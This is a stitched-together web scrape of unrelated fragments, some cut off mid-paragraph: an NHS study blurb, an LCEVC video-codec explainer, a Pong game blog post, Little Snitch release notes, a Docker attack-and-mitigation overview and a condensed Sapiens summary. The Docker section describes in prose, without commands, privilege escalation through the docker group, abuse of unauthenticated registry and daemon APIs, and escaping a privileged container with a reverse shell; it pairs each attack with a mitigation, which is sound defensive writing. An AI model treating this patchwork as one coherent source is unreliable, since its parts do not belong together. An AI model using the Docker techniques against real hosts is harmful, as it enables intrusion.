<p>“As one of the leading NHS trusts for research and innovation, known for our strong track record of recruiting to studies, we were selected to rapidly enlist a cohort of healthcare workers to take part in this important research – and 1,200 MFT staff swiftly answered the call.</p>

<p>“The study was delivered at the NIHR Manchester Clinical Research Facilities at Manchester Royal Infirmary and Wythenshawe Hospital (both part of MFT), which provide dedicated research space and highly-trained staff.

<p><strong>The LCEVC Codec (MPEG-5 Part 2) or “Low Complexity Enhancement Video Coding” is one of the three new codecs being introduced by MPEG (others being Versatile Video Coding (VVC) and Essential Video Coding (EVC)) with the aim of increased compression efficiency for existing codecs at little to no increase in coding complexity by the use of a base bitstream and an enhancement bitstream.</strong></p>



<p>In&nbsp;<a href="https://www.itu.int/en/ITU-T/Workshops-and-Seminars/20191008/Documents/Guido_Meardi_Presentation.pdf" target="_blank" rel="noopener">this excellent presentation</a>&nbsp;at the ITU Workshop on the Future of Media in Geneva, Guido Meardi who is the CEO &amp; Co-Founder of&nbsp;<a href="https://www.v-nova.com/" target="_blank" rel="noopener">V-Nova</a>&nbsp;gave a detailed introduction to the LCEVC codec. And, he referred to LCEVC (MPEG-5 Part 2) as “a codec to improve other codecs” – which is actually quite true! For those who don’t know, V-Nova has been instrumental in driving the LCEVC standard through their research and work on the Perseus codec. More information on that&nbsp;<a href="https://www.v-nova.com/v-nova-video-compression-technology/" target="_blank" rel="noopener">here</a>.</p>



<p>In this article, let’s take a look at</p>



<ul><li>the “why” and “what” behind the LCEVC codec standardization</li><li>how the encoder and decoder work</li><li>theoritical complexity considerations</li><li>possible applications of the LCEVC codec</li></ul>




<h2 id="what-is-the-lcevc-codec-mpeg-5-part-2"><span id="What_is_the_LCEVC_Codec_(MPEG5_Part_2)"></span>What is the LCEVC Codec (MPEG-5 Part 2)?<span></span></h2>



<p>The LCEVC codec (Low Complexity Enhancement Video Coding) aims at being&nbsp;<strong>“a codec to improve other codecs”</strong>&nbsp;at a low complexity overhead. The LCEVC codec’s output is a combination of a “base bitstream” produced by an existing video codec such as AVC, HEVC, VP9, AV1, etc. along with enhancement layers that can be used conditionally to improve the quality of the video.</p>



<p>If the decoder/end-device supports LCEVC, the enhancement layers are decoded, else, the base codec alone is used to decode the bitstream and the video is rendered to the user. This ensures backward-compatibility and encourages roll-out of the LCEVC codec without the fear of breaking the end-user’s experience.</p>



<p>This concept is nicely captured in the figure below (taken from Guido Meardi’s Presentation at Geneva).</p>

<p>In the next few articles of our series on the LCEVC codec, let’s learn how to produce an LCEVC bitstream using FFmpeg, and dive more into the details of the filters used in LCEVC.</p>



<p>Without further ado, let’s get started, shall we?</p>



<h2 id="key-requirements-of-the-lcevc-codec"><span id="Key_Requirements_of_the_LCEVC_Codec"></span>Key Requirements of the LCEVC Codec<span></span></h2>



<p>The key requirements for the LCEVC project&nbsp;<a href="https://mpeg.chiariglione.org/standards/exploration/low-complexity-video-coding-enhancements/requirements-low-complexity-video" target="_blank" rel="noopener">were specified by MPEG</a>&nbsp;and here is a summary –</p>



<ul><li>when enhancing an n-th generation MPEG codec (e.g., AVC), the compression efficiency for the aggregate stream is appreciably higher than that of the n-th generation MPEG codec used at full resolution and as close as possible to that of the (n+1)-th generation MPEG codec (e.g., HEVC) used at full resolution, at bandwidths and operating conditions relevant to mass market distribution;</li><li>encoding and decoding complexity for the aggregate full resolution video (i.e., base plus enhancement) shall be comparable with that of the base encoder or decoder, respectively, when used alone at full resolution.</li></ul>



<p>In simpler terms, the aims of the LCEVC codec are –</p>



<ul><li>when the base codec is AVC for example, then the compression efficiency when using LCEVC (base and enhancement layers) should be higher than just using AVC to encode the full resolution video (else, what is the point of a new codec, right?)</li><li>when the base codec is AVC for example, then the complexity (both encoding and decoding) of the LCEVC codec should be comparable with the base codec’s complexity for encoding the full resolution video. In other words, LCEVC should not dramatically increase the complexity of the encoder/decoder for compression gains – if it did, it wouldn’t be low complexity, now would it?</li></ul>



<p>Further more, the&nbsp;<a href="https://mpeg.chiariglione.org/standards/exploration/low-complexity-video-coding-enhancements/requirements-low-complexity-video" target="_blank" rel="noopener">MPEG document</a>&nbsp;also talks about the “key implementation and non-technical requirements” and they are:-</p>



<ul><li>the video stream should be decodable without specific firmware or OS support by all devices capable to decode the base codec, with substantially same resource utilization (e.g., processing power, battery consumption, etc.) as the base decoder at full resolution decoded in hardware;</li><li>all web browsers should be able to decode high resolution video without plug-ins and/or browser upgrade, e.g. via HTML5 javascript;</li><li>the additional data stream should be compatible with the existing ecosystem, e.g. ad insertion, metadata management, CDNs, DRM/CA and network protocols such as DASH, HLS, MMT and SS;</li><li>the overall processing power requirement to encode a video stream should be comparable with that of the base codec when used alone at full resolution.</li></ul>



<p>All good! Ultimately, the aims of the LCEVC codec are to</p>



<ul><li>improve the compression efficiency of any other codec with little or no increase in coding complexity.</li><li>be backward compatible so that legacy devices and software can decode the bitstreams from the base codec if they do not have support for the LCEVC codec’s enhancement layers.</li></ul>



<p>With this understanding, let’s now dive into the architectural details of the LCEVC codec’s Encoder and Decoder.</p>

<p>To understand the inner-workings of the LCEVC Encoder, let’s take a look at the block diagram from a&nbsp;<a href="https://www.itu.int/dms_pub/itu-s/opb/journal/S-JOURNAL-ICTS.V3I1-2020-12-PDF-E.pdf" target="_blank" rel="noopener">paper published in the ITU Journal</a>&nbsp;(<em>please take some time and read this – it has a good explanation of the LCEVC codec.</em>)</p>

<p>The&nbsp;<a href="https://www.itu.int/dms_pub/itu-s/opb/journal/S-JOURNAL-ICTS.V3I1-2020-12-PDF-E.pdf" target="_blank" rel="noopener">block diagram above</a>&nbsp;gives a very clear picture of the encoding process of the LCEVC codec and here is how it works –</p>



<ol><li><strong>Downsampling:</strong>&nbsp;There are two downsampler blocks that receive the full-resolution image as the input and produce two downsampled images (one each at the output of the first and second stage downsampling respectively).</li><li><strong>Compressing using the base codec</strong>: The base encoder takes the output of the second-stage downsampler and compresses it using a “base codec” which can be anything you choose (AVC, HEVC, AV1, VP9, etc.).</li><li><strong>Upsample and Compress at Level L1</strong><ol><li>Next, the base-image (downsampled two times) is upsampled once.</li><li>A difference image is computed using the upsampled image and the output of the first stage downsampler.</li><li>The difference image goes through transform, quantization, and entropy coding and the final output is transmitted as the “L1-Coefficient Layer”.</li></ol></li><li><strong>Prepare the Input for the L2 Stage</strong>: The encoded output of the L1 stage is reconstructed and then it is upsampled to produced a reconstructed image of the original resolution (because it has been upsampled two times now).</li><li><strong>Compression at Level L2</strong><ol><li>At level L2, you have the (1) original image and (2) the reconstructed image (<em>that started its life at the base layer</em>).</li><li>The difference of these two images is computed and then compressed to produce the L2 Coefficient Layers.</li><li>Optionally, temporal prediction can be performed and the resultant prediction coefficients can be compressed and transmitted to the end-device.</li></ol></li><li><strong>Encoding sparsely populated images</strong>: this is a huge technical challenge because the Discrete Cosine Transform (DCT) was designed to take advantage of spatial correlation between pixels. The LCEVC codec has worked around this problem by introducing small transform kernels (2×2 and 4×4) to avoid trying to compress large blocks of information.</li><li><strong>Entropy Coding of the Enhancement Layer Coefficients</strong>: Considering that the information is quite sparse to begin with and the use of small 2×2 and 4×4 kernels, the authors of LCEVC decided to use a Run Length Encoder (RLE) and a Prefix Coding Encoder. A Run-Length Encoder is a very simple method of entropy coding and has been used successfully in the past as the basis of CAVLC (H.264/AVC).</li><li><strong>Temporal prediction</strong>&nbsp;between the original full resolution image and the reconstructed full-resolution image. This results in the Layer 2 Enhancement Coefficients and the encoded Prediction Vectors.</li></ol>



<p><strong>Note:</strong>&nbsp;Using large transform kernels to compress sparse information is a bad idea e.g., if you have a 32×32 DCT applied on a 32×32 macroblock that is filled with mostly black pixels with 20 white pixels randomly distributed (2% white) and you decide to use DCT on it, its a safe bet that those white pixels will get lost during the DCT &amp; quantization process. This might be fine for normal image compression, but, when you are trying to compress “difference” images, then preserving sparse regions is very important.</p>



<p><strong>Note:</strong>&nbsp;The details of the transform kernels, upsampling and downsampling filters are too complex for this introductory article on LCEVC and will be covered in a future article in this series.&nbsp;<a href="https://ottverse.com/subscribe">Subscribe</a>&nbsp;to get notified of these articles directly in your inbox.</p>

We won’t dive into it in detail because the decoder does the opposite of what the encoder does and the block diagram explains this process very well.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s been a while since I last wrote a blog post, let alone a one building a new tiny game. So the latest addition is <a href="https://pong.ivaylopavlov.com/" target="_blank" rel="noopener noreferrer">https://pong.ivaylopavlov.com</a> as you can probably guess, it’s a simple game of pong. I remember that back in the day, many programmers started out with building either Tetris or a pong game in C or C++. Since I already did a <a href="https://tetris.ivaylopavlov.com/">Tetris</a> one, I thought why not do the other one. It also gave me an opportunity to try out a new framework in JavaScript, which I haven’t really fiddled with, which turned out to be surprisingly popular and easy to use called <a href="https://p5js.org/"><strong>p5</strong></a>.</p>
<p>As usual, the entire source code, very far from perfect, for a week-long project, is available here – <a href="https://github.com/ivailop7/IvoPong" target="_blank" rel="noopener noreferrer">https://github.com/ivailop7/IvoPong</a>, so feel free to fork and make a better version.</p>
<h3>Initial Choices</h3>
<p>Since, I wanted to host it on the web behind AWS’ CloudFront CDN, I was stuck with the classics of 2020 – <strong>TypeScript</strong>, <strong>ReactJS</strong> and <strong>Styled-components</strong> for the CSS-in-JS. The interesting choice was <strong>p5</strong>, since I needed something that would allow drawing. All my games so far were mostly matrix-based, so doing simple images rendered based on a matrix cell, worked out fine for me, but having a bouncy ball go across the screen, would not have looked nice. It didn’t take long to find this well-documented library called p5, which allows you to draw in JavaScript. My only experience with drawing in JS, for all my years of experience has only been D3, so classic timeseries and pie charts and a heatmap here and there. Nothing super fancy. I’ve done more interesting stuff with seaborn and matplotlib in Python in my <a href="https://www.ivaylopavlov.com/chart-healthkit-data-jupyter-notebook/">health analytics post</a>. Other choices were, that I wanted to build something very simple and avoid class components and use react <a href="https://reactjs.org/docs/hooks-intro.html">hooks only</a>, no <a href="https://reactrouter.com/web/guides/quick-start">react-router</a> and no <a href="https://redux.js.org/">redux</a> setup. The choices were a mixed bag, will get on this in just a bit. The intention was desktop-first, mobile later on, maybe.</p>
<h3>Drawing in JavaScript for the first time</h3>
<p>I always imagined that for 2D drawing, it would be just axis coordinates, some hex values for coloring and maybe extra parameters to make corners round. Et voila, it turned out that I was right, or least in the context of p5. So let’s take the <em>rectangle</em> <a href="https://p5js.org/reference/#/p5/rect">p5.rect</a> which is the entire foundation – the two paddles and the circle, which is perfect <em>ellipse</em>. The scores are <em>text</em>, which as I learned later, is nearly impossible to make into a hyperlink, unless you do invisible area around the text and detect if the mouse clicked inside. Compared to a hyperlink tag, given it’s in a browser, it’s the definition of overengineering. After a lot of initial code duplication, just to offset the X axis, we end up with this monochrome look:</p>

<p>Then it’s the time-consuming part of detecting paddle and wall hits. If you had a single paddle, easy. You easily find yourself in corner cases, for example if the top pixel of the ball hits perfectly the bottom pixel of the paddle, should this be a hit or a miss, I consider it a hit, but inspecting visually with a fast-moving ball, you would think it’s a bug. That’s one of the cases, there were quite a few I came up with as I was going along, but I kept it very simple, in order to finish the entire thing in under 5 days. Another thing to consider is the ball angle depending on which part of the paddle is hit. If it hits the upper half, should go up, lower half down, otherwise with constant change of the X/Y angle you would often end up in a perfect angle replication if neither player moves the paddle. Here is some “<em>should reduce if statements</em>” sample code of how it looks like:</p>
<pre title="Sample Code">// Detect collision with right paddle
// if hit with upper half of paddle, redirect up, if lower half, redirect down
if (
    this.xBall &gt;= this.windowWidth - this.borderOffset - this.paddleWidth - (this.diameter / 2) &amp;&amp;
    this.yBall &lt;= this.yPaddleRight + this.paddleHeight &amp;&amp;
    this.yBall &gt;= this.yPaddleRight
) {
    if (
       this.yBall &gt;= this.yPaddleRight &amp;&amp;
       this.yBall &lt; (this.yPaddleRight + (0.5 * this.paddleHeight))
    ) {
       this.yBallSpeed = Math.abs(this.yBallSpeed) * -1;
    }
    if (
       this.yBall &gt; (this.yPaddleRight + (0.5 * this.paddleHeight)) &amp;&amp;
       this.yBall &lt;= (this.yPaddleRight + this.paddleHeight)
    ) {
    this.yBallSpeed = Math.abs(this.yBallSpeed);
    }

    this.xBallSpeed = Math.abs(this.xBallSpeed) * -1;
}
</pre>
<h3>The sketch, the state and the menu components</h3>
<p>To get the sketch inside a react component, I used <a href="https://www.npmjs.com/package/react-p5">react-p5</a>, which has types and exposes the APIs you would need, such as keyPressed, etc. I had to use a class component, instead of hooks, the reason is because the sketch state was different from the react component state, so if the variables inside the <strong>draw()</strong> method were put in hooks or in a class component state, you actually don’t get animations, since react re-renders and it’s missing the animations, so the target to use only hooks had to go, since I needed non-react state. The second consideration, avoiding react-router and redux, made the code, despite the simplicity, just ugly in my opinion, for a 3 screen app – menu, rules popup, actual game. Adding links and routes, seemed like an overkill, but then to implement a “start game” button and “go back to menu”, required having the menu component render the game component and the game to listen for a flag to render the menu. Despite being a valid react paradigm, this circular dependency didn’t sit well with me. Kept it, nonetheless. Redux was easily avoided, I believe in total the entire non-sketch state was about 5-6 booleans, which could be further optimized. Unlike the previous games, I went with styled-components, since I’ve been using it more at work and felt confident that I won’t waste much time getting stuff to work. All went smoothly, since I didn’t do anything fancy. Centering an image inside a div in 2020 is still a pain.</p>
<h3>The usual considerations</h3>
<p>Once I get a web game running in a browser, the natural follow up question is, how would this play on a mobile phone or tablet. I dread this part, since the design for mobile would be different, for example, have the playing field vertical instead of horizontal etc. I was pleasantly surprised that p5 had native support for touch events and provided a very rich event context, a sample of the object below:</p>

<p>It was enough to have the screen virtually split in quadrants and each one to move the respective paddle up and down. If it wasn’t that easy, I probably would have not done the mobile piece at all. It’s just that there’s always that consideration of the inputs, my favorite game is Tetris, yet after so many years, playing on a touch screen device is still as terrible and clumsy as it first came out for iOS and Android. The game was created for a keyboard/gamepad-like input. Resolutions-wise, since p5 had stellar support, this wasn’t much of an issue.</p>
<h3>Conclusion</h3>
<p>I can strongly encourage to look into p5 for drawing in 2D, if you want to explore your creative side inside JavaScript. It also supports WebGL, if you want to experiment with 3D, but I didn’t get to that part. It’s a great base for simple games and fun projects. ReactJS and its entire ecosystem is not going anywhere and it is getting better and more established by the day. With the strong corporate push behind the core technologies – Chromium, TypeScript, Visual Studio Code, ReactJS, GraphQL from the tech giants, you should explore the ecosystem and create freely! Good luck!</p>

<h3 id="first-releasenotes-headline">Little Snitch 5.0 <span>(6142)</span></h3>
<div>
<h4>What’s new in Little Snitch 5?</h4>
<p>There has been quite a bit of public discussion recently about the deprecation of various types of kernel extension on macOS. Among them are Network Kernel Extensions (NKEs). You probably did not care so far, but Little Snitch 4 was based on an NKE to do its job. Since NKEs are now deprecated and no longer officially supported by Apple, we have spent the last year rewriting the core of Little Snitch to the Network Extension (NE) framework. While working on this core, we took the chance to revise some old design decisions and add some long anticipated features.</p>
<h4>So what are the benefits of the new version?</h4>
<ul>
<li>Compatibile with (and requires) macOS Big Sur.</li>
<li>Future-proof, because it is based on the new Network Extension and Endpoint Security frameworks.</li>
<li>Drag and Drop installation and upgrade, no reboot required.</li>
<li>Universal Binary which runs on both Intel and Apple Silicon Macs.</li>
<li>Little Snitch now comes with a command line interface for preferences editing, configuration import and export, debugging, logging and access to traffic history.</li>
<li>The time range available in Network Monitor’s traffic diagram has been extended from one hour to up to a year.</li>
<li>Rules can now specify a list of port numbers, not just one contiguous range as before.</li>
<li>The export format for backups is human readable normalized JSON.</li>
<li>Recording of network statistics is done independently of Network Monitor. You can quit Network Monitor and still have statistics recorded.</li>
<li>Live traffic logs via command line tool.</li>
<li>Ready for mass deployment installation in corporate environments.</li>
</ul>
<h4>Upgrade pricing</h4>
<p>If you have purchased Little Snitch 4 after November 1, 2019, you can upgrade to Little Snitch 5 for free – just use your existing license key. If you purchased Little Snitch 4 before that period, you can get the upgrade at a reduced price.</p>

<h3>Little Snitch Technology Preview <span>(6121)</span></h3>
<div>
<p><strong>This is a hotfix for a bug in macOS Big Sur Beta 5! Please install this version before upgrading to Beta 5! Otherwise you won’t be able to boot your computer!</strong></p>
<p>This version does not install an Endpoint Security System Extension because Big Sur Beta 5 suffers a kernel panic immediately after booting this System Extension is installed. During upgrade, an existing Endpoint Security System Extension is removed. Currently, the only function of the Endpoint Security System Extension is to detect access to Berkeley Packet Filter devices. This version can therefore not warn when a process tries to access the Berkeley Packet Filter.</p>
<p>The good news is that Big Sur Beta 5 fixes an other kernel panic which occurred on some computers when Little Snitch’s Network Extension was installed.</p>

<h3>Little Snitch Technology Preview <span>(6104)</span></h3>
<div>
<p>This Technology Preview of Little Snitch is not yet feature complete. There are several known limitations you should be aware of before you install:</p>
<h4>Installation</h4>
<p>During the installation you will be asked to enable system extensions in System Preferences &gt; Security &amp; Privacy. After clicking on “Open Security Preferences”, the same dialog will appear once again. This is a bug in macOS Big Sur.</p>
<p><img src="https://www.obdev.at/Images/littlesnitch-big-sur/enable-system-extensions.png" alt="" srcset="https://www.obdev.at/Images/littlesnitch-big-sur/enable-system-extensions@2x.png 2x"></p>
<p>After clicking on “Allow…” in System Preferences &gt; Security &amp; Privacy, you will see a confirmation dialog containing two entries labeled “Placeholder Developer”. These incorrect labels are a bug in macOS Big Sur. The checkboxes for both of these entries must be checked.</p>
<h4>Known Limitations</h4>
<ul>
<li>Rules and settings from previous versions of Little Snitch are not yet imported. Little Snitch will therefore start with the default factory rule set.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Docker is one of the most widely used container-based technologies. It is a tool which helps to create, deploy, and run applications by using containers.</p><p>Containers make it easy for the developers to build the application with all its dependencies and libraries and ship it out as one package. But with new technologies come new vulnerabilities.</p><p>We’ll be looking into a few attacks that can be performed to exploit docker vulnerabilities.</p><h2 id="privilege-escalation-in-a-host-using-docker">Privilege escalation in a host using Docker</h2><p>In the docker setup, a user with low privilege (non-root user) is added to the docker group to perform docker related tasks without giving the user root or sudo privileges. A low privilege user (non-root user) in a Linux machine with Docker group assigned, can escalate the privilege to a root user and perform an administrative task in the host machine.</p><h3 id="mitigation">Mitigation</h3><p>It is recommended to run the docker daemon in rootless mode. Rootless mode executes the Docker daemon and containers inside a user namespace. A feature of Linux that can be used to separate the user IDs and group IDs between the host and containers is called User Namespaces.</p><p>User Namespaces can provide better isolation and security: the privileged user root in the container can be mapped to a non-privileged user on the host. A rootless mode is a mode where both the daemon and the container are running without root privileges.</p><h2 id="dangling-volumes">Dangling Volumes</h2><p>When the images are deleted from the host machine, this action will not lead to the deletion of the mounted volume automatically.</p><p>If an attacker has gained access to the host machine during the exploitation phase, he/she can look for dangling volumes on the docker host as part of post-exploitation phase and examine for sensitive information in the volume, which can further be used to attack the infrastructure or the application in the environment.</p><p>For example, consider a scenario where a developer has mounted a volume on the host and has written a sensitive file which contains database password/username. The volume created is then shared with a container.</p><p>Now when the developer tries to stop and remove the container, although the container is deleted, the volume is still dangling around and we can access the data in it. An attacker having access to a docker host can access this sensitive data.</p><h3 id="mitigation-1">Mitigation</h3><ul><li><p>It is always advised to remove the container with -v flag. If the -v flag is not being used when removing the container, the volume will always end up dangling and remain in the local disk.</p></li><li><p>Another method to go about this is to use a command docker image prune. This allows us to clean up all unused images.</p></li></ul><h2 id="exploiting-docker-private-registry">Exploiting Docker Private Registry</h2><p>Creating Private Registry is useful in a scenario where an organization needs to organize all the custom images privately and does not want to publish it to the public docker registry.</p><p>An attacker can access insecure private registry remotely using the docker registry HTTP API to enumerate the list of repositories in the private registry.</p><p>An attacker can also use this attack vector to download the images in the private registry to localhost via remote API using the blobSum information to check the underlying code for any sensitive information.</p><p>The retrieved information can be used for a further attack in the network or application.</p><h3 id="mitigation-2">Mitigation</h3><ul><li><p>Implement Authentication based mechanism to access the private registry (Token-based, bearer, OAuth, etc.).</p></li><li><p>Implement Content Trust to impose client-side signing and validation of image tags.</p></li><li><p>Implement TLS.</p></li></ul><h2 id="accessing-docker-secrets-in-environment-variables">Accessing Docker Secrets in Environment Variables</h2><p>Developers use environment variables as a storage place to hardcode all the sensitive information like username, passwords, API keys, etc in the docker container.</p><p>This information can then be used by their application running in the container to retrieve the sensitive information from the environment variables to make database queries or API calls. This can impose a great impact on the docker container security.</p><p>An attacker having the ability to run operating system commands via web application execution vulnerability can easily view the sensitive information set in the environment variable.</p><h3 id="mitigation-3">Mitigation</h3><ul><li><p>It is recommended to secure the web application and perform proper input validation to stop an attacker from executing system commands.</p></li><li><p>It is recommended not to store sensitive information like passwords, keys, auth-tokens in the environment variables.</p></li></ul><h2 id="exploiting-docker-daemon-api">Exploiting docker Daemon API</h2><p>Docker daemon API is set up and configured to allow users to remotely access and administrate the docker related tasks via API. The use of API also helps in building automation scripts for the remote docker deployment without having to log in to the host system where the docker is installed to run the docker tasks.</p><p>As there is no authentication implemented by default on Docker daemon API, an attacker can invoke the API remotely and perform an administrative task. An attacker can perform both enumeration and exploitation techniques using a python custom script.</p><p>This custom script can be used to compromise a remote host and get a foothold on the host machine where docker daemon is running with root privilege.</p><h3 id="mitigation-4">Mitigation</h3><p>It is recommended to implement an authentication mechanism to the Docker daemon API and also implement TLS to the API call.</p><h2 id="container-escape-using-privileged-flag">Container Escape Using Privileged Flag</h2><p>In an organization, when the development team will need to access the host resources from the container environment, it can be achieved using the “–privileged flag” while running the container.</p><p>As the privileged flag is used to access the PID of the host from the container, an attacker having an initial foothold on the container can escape from the container environment and access the host machine with root privilege. This is achieved by injecting a reverse shell payload to the root process of the host machine.</p><h3 id="mitigation-5">Mitigation</h3><p>It is recommended to implement container hardening techniques in order to limit the activity of the attacker after getting an initial foothold on to the system.</p><p>Hardening techniques can be implemented to increase the docker container security.</p><p>For example, the ability to download third party files using wget must be disabled. This is one of the ways to implement docker container security. This can also be achieved using any of the following features:</p><ul><li>Capabilities</li><li>AppArmor</li><li>SECcomp</li></ul><h2 id="conclusion">Conclusion</h2><p>Containers help developers to create more secure environments because it isolates software. However, using containers also increases the attack surface and risks because containerization of software also adds extra layers of abstraction and complexity which can increase docker vulnerabilities in the container environment.</p><p>This poses challenges for both attackers and defenders of docker systems. This can be tackled in the right way by adding an additional level of docker container security like AppArmor, SECcomp and other suitable hardening techniques.</p><div><div><div><div><div><div><p>Check your website security today and</p><p>identify vulnerabilities before hackers exploit them.</p></div></div></div></div></div></div><hr><div><div><div><p><img src="https://beaglesecurity.com/blog/images/sanj.jpg" alt="Avatar"></p></div></div></div></div></div>]]>

<p>I spent over 25 hours building a cut-down version of Sapiens. The goal? Future-me should be happy to read this once future-me forgets how we evolved. It’s massive for a blog post, just under 30 minutes, but that’s the best I could do, condensing 9 hours worth of material.</p>

<p>I’ve tried to keep editing to a minimum: It’s the original text, edited to ensure it still flows like the book.</p>

<h2 id="development-of-brains">Development of brains</h2>

<p>What caused our brains to develop? We’re not sure.</p>

<p>It doesn’t seem likely. A larger brain needs more energy and thus reduces the chance you’ll survive. Getting more energy meant hunting more.</p>

<p>One contributing factor was the domestication of fire. Fire paved the way for cooking.</p>

<p>Whereas chimpanzees spend 5 hours a day chewing raw food, a single hour suffices for people eating cooked food. The advent of cooking enabled humans to eat more kinds of food, to devote less time to eating, and to make do with smaller teeth and shorter intestines. Some scholars believe there is a direct link between the advent of cooking, the shortening of the human intestinal track, and the growth of the human brain. Since long intestines and large brains are both massive energy consumers, it’s hard to have both. By shortening the intestines and decreasing their energy consumption, cooking inadvertently opened the way to the jumbo brains.</p>

<p>And, we weren’t alone. Competing with us were the Neanderthals, among other species. They were stronger, they had bigger brains, and they could survive the cold. How come, then, did we “win”?</p>

<p>We aren’t sure. The most likely answer is the very thing that makes the debate possible: Homo sapiens conquered the world thanks above all to its unique language.</p>

<h2 id="cognitive-revolution">Cognitive Revolution</h2>

    <img src="https://neilkakkar.com/assets/images/sapiens-timeline-2.jpg" alt="" usemap="#image-map">
    
    
    
</figure>

<p>The appearance of new ways of thinking and communicating, between 70,000 and 30,000 years ago, constitutes the Cognitive Revolution. What caused it? We’re not sure. The most commonly believed theory argues that accidental genetic mutations changed the inner wiring of the brains of Sapiens, enabling them to think in unprecedented ways and to communicate using a new type of language. We might call it the Tree of Knowledge mutation.</p>

<!-- 
> All new humans are improvements over the past?
> As in, the de facto keeps rising.

>These mutated humans were praised for their initiative and were more successful
>Till everyone became like this and then even more better humans were praised and the previous became the normal -->

<p>What’s special about our language?</p>

<p>Our language is amazingly supple. We can connect a limited number of sounds and signs to produce an infinite number of sentences, each with a distinct meaning. We can thereby ingest, store and communicate a prodigious amount of information about the surrounding world. A monkey can yell to its comrades, ‘Careful! A lion!’ But a modern human can tell her friends that this morning, near the bend in the river, she saw a lion tracking a herd of bison. She can then describe the exact location, including the different paths leading to the area. With this information, the members of her band can put their heads together and discuss whether they ought to approach the river in order to chase away the lion and hunt the bison.</p>

<!-- Most likely, both the gossip theory (who can be trusted and who can't) and the there-is-a-lion-near-the-river theory are valid.  -->

<p>Yet the truly unique feature of our language is not its ability to transmit information about men and lions. Rather, it’s the ability to transmit information about things that do not exist at all. As far as we know, only Sapiens can talk about entire kinds of entities that they have never seen, touched or smelled.</p>

<!-- The alpha male usually wins his position not because he is physically stronger, but because he leads a large and stable coalition -->

<p>Using language, lots of humans could work together, form a tribe, help each other, and hunt together.</p>

<p>However, communicating with lots of people brings with it new co-ordination problems. The critical threshold for a group interacting together is 150 people.</p>

<!-- But once the threshold of 150 individuals is crossed, things can no longer work that way. You cannot run a division with thousands of soldiers the same way you run a platoon. Successful family businesses usually face a crisis when they grow larger and hire more personnel. If they cannot reinvent themselves, they go bust.  -->

<p>How did Homo sapiens manage to cross this critical threshold, eventually founding cities comprising tens of thousands of inhabitants and empires ruling hundreds of millions? The secret was probably the appearance of fiction. Large numbers of strangers can cooperate successfully by believing in common myths. This is an imagined reality.</p>

<!-- Ever since the Cognitive Revolution, Sapiens has thus been living in a dual reality. On the one hand, the objective reality of rivers, trees and lions; and on the other hand, the imagined reality of gods, nations and corporations.  -->

<!-- As time went by, the imagined reality became ever more powerful, so that today the very survival of rivers, trees and lions depends on the grace of imagined entities such as gods, nations and corporations. -->

<p>Unlike lying, an imagined reality is something that everyone believes in, and as long as this communal belief persists, the imagined reality exerts force in the world.</p>

<p>In other words, while the behaviour patterns of archaic humans remained fixed for tens of thousands of years, Sapiens could transform their social structures, the nature of their interpersonal relations, their economic activities and a host of other behaviours within a decade or two.</p>

<!-- > Because of the cognitive Revolution and the introduction of imagined reality -->

<p>For example, consider trade. Trade cannot exist without trust, and it is very difficult to trust strangers. The global trade network of today is based on our trust in such fictional entities as the dollar, the Federal Reserve Bank, and the totemic trademarks of corporations. When two strangers in a tribal society want to trade, they will often establish trust by appealing to a common god, mythical ancestor or totem animal.</p>

<!-- One on one, even ten on ten, we are embarrassingly similar to chimpanzees. Significant differences begin to appear only when we cross the threshold of 150 individuals, and when we reach 1,000–2,000 individuals, the differences are astounding -->

<!-- The real difference between us and chimpanzees is the mythical glue that binds together large numbers of individuals, families and groups. This glue has made us the masters of creation. -->

<p>Our Tree of Knowledge mutation was significant. However, it’s not just our biology that brought us where we are today.</p>

<ol>
  <li>
    <p>Biology sets the basic parameters for the behaviour and capacities of Homo sapiens. The whole of history takes place within the bounds of this biological arena.</p>
  </li>
  <li>
    <p>This arena is extraordinarily large, allowing Sapiens to play an astounding variety of games. Thanks to their ability to invent fiction, Sapiens create more and more complex games, which each generation develops and elaborates even further</p>
  </li>
  <li>
    <p>Consequently, in order to understand how Sapiens behave, we must describe the historical evolution of their actions.</p>
  </li>
</ol>

<!-- Referring only to our biological constraints would be like a radio sports-caster who, attending the World Cup football championships, offers his listeners a detailed description of the playing field rather than an account of what the players are doing. -->

<!-- There is some evidence that the size of the average Sapiens brain has actually decreased since the age of foraging. Survival in that era required superb mental abilities from everyone. When agriculture and industry came along people could increasingly rely on the skills of others for survival, and new ‘niches for imbeciles’ were opened up. You could survive and pass your unremarkable genes to the next generation by working as a water carrier or an assembly-line worker. -->

<h2 id="agricultural-revolution">Agricultural Revolution</h2>

<figure>

<p>The currency of evolution is neither hunger nor pain, but rather copies of DNA helixes. Just as the economic success of a company is measured only by the number of dollars in its bank account, not by the happiness of its employees, so the evolutionary success of a species is measured by the number of copies of its DNA. If no more DNA copies remain, the species is extinct, just as a company without money is bankrupt. If a species boasts many DNA copies, it is a success, and the species flourishes. From such a perspective, 1,000 copies are always better than a hundred copies. This is the essence of the Agricultural Revolution: the ability to keep more people alive under worse conditions.</p>

<p>Rather than heralding a new era of easy living, the Agricultural Revolution left farmers with lives generally more difficult and less satisfying than those of foragers. Hunter-gatherers spent their time in more stimulating and varied ways, and were less in danger of starvation and disease. The Agricultural Revolution certainly enlarged the sum total of food at the disposal of humankind, but the extra food did not translate into a better diet or more leisure. Rather, it translated into population explosions and pampered elites. The average farmer worked harder than the average forager, and got a worse diet in return. The Agricultural Revolution was history’s biggest fraud.</p>

<!-- > The average person in Jericho of 8500 BC lived a harder life than the average person in Jericho of 9500 BC or 13,000 BC. But nobody realised what was happening. Every generation continued to live like the previous generation, making only small improvements here and there in the way things were done. Paradoxically, a series of ‘improvements’, each of which was meant to make life easier, added up to a millstone around the necks of these farmers -->
<!-- 
--- Way of life being lost over generations
    Like with the foundation.
    Also short sightedness.
    As, working harder here meant more food => can better feed children => even more people exist => You're back where you started, except you're working harder.
 -->

<p>Compared to foraging, working a bit harder on the farm meant more food. Settling down on the farm also meant greater freedom to reproduce - you’re not travelling all the time, so you can afford to have more children. This in turn, meant a higher population. And a higher population meant higher food requirements. Thus, the farmers were forced to work even harder.</p>

<p>Why didn’t humans abandon farming when the plan backfired? Partly because it took generations for the small changes to accumulate and transform society and, by then, nobody remembered that they had ever lived differently. And partly because population growth burned humanity’s boats. If the adoption of ploughing increased a village’s population from a hundred to 110, which ten people would have volunteered to starve so that the others could go back to the good old times? There was no going back. The trap snapped shut.</p>

